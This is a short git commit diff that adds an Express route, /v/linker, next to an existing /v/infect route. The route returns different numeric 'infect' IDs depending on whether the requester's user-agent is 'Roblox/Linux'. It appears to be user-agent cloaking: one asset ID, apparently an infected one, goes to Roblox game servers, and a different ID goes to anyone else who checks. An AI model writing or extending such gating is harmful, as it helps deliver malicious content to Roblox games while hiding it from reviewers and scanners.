0ab82b8acdd796b5ca4bc35011730acc4365557e
XesteristHax <140212109+XesteristHax@users.noreply.github.com>
2026-03-16 22:09:03 -0400

    Update server.js

--- server.js
+++ server.js
@@ -8,5 +8,12 @@ app.get('/v/infect', async (req,res) => {
   };
   return res.json({infect:779029809257501})
 })
-
+app.get('/v/linker',async(req,res)=> {
+const agent = req.headers['user-agent'];
+  console.log(agent)
+  if (agent !== "Roblox/Linux") {
+    return res.json({infect:17858917701})
+  };
+  return res.json({infect:116469203325928})
+})
 app.listen(3000)
